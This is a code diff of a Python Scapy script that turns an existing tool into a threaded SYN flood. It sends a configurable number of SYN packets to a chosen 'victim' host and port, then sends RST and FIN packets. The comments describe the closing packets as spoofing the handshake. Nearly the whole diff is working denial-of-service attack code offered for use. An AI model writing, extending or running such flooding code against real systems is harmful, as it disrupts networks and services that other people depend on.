@@ -15,6 +15,12 @@ def get_arguments():
         options, arguments = parser.parse_args()
         return options
 
+
+options = get_arguments()
+target = options.target
+port = int(options.port); payload = int(options.payload)
+
+'''
 # function to perform the flood
 def flood (victim_ip, port, payload):
  	SYNpkt = IP(dst=victim_ip, ttl=20)
@@ -44,16 +50,42 @@ def flood (victim_ip, port, payload):
 	# that we have no more business with them
 	# effectively spoofing our
 	# entire previous handshake
+'''
+def attack ():
+	ip = IP(dst=target, ttl=20)
+	syn = TCP(sport=1500, dport=port, flags='S')
+
+	send(ip/syn, verbose=0)
+
+# Spawn a thread per request
+all_threads = []
+print('\nStarting SYN flood attack...')
+for i in xrange(payload+1):
+	print('\nPacket %i sent' % i)
+	t1 = threading.Thread(target=attack)
+	t1.start()
+ 	all_threads.append(t1)
+
+	# Adjusting this sleep time will affect requests per second
+	time.sleep(0.01)
+
+for current_thread in all_threads:
+	current_thread.join()  # Make the main thread wait for the children threads
+
+# after you send all SYN, send an RST and FIN
+# to ensure the connection is closed
+RSTpkt = TCP(sport=1500, dport=port, flags="R")
+FINpkt = TCP(sport=1500, dport=port,flags="F")
 
 
-options = get_arguments()
-target = options.target
-port = int(options.port); payload = int(options.payload)
+print("Sending RST packet to reset...")
+send(IP(dst=target, ttl=20)/RSTpkt, verbose=0) # reset connection
 
-try:
-        # call the flood function which will do all the required printing
-        flood(target, port, payload)
-except KeyboardInterrupt as interrupt:
-        print("Quitting...")
-        sys.exit(0) # quit and raise no error
+print("Sending FIN to end connection...")
+send(IP(dst=target, ttl=20)/FINpkt, verbose=0) # assure victim
+# that we have no more business with them
+# effectively spoofing our
+# entire previous handshake
+
+sys.exit(0)
 
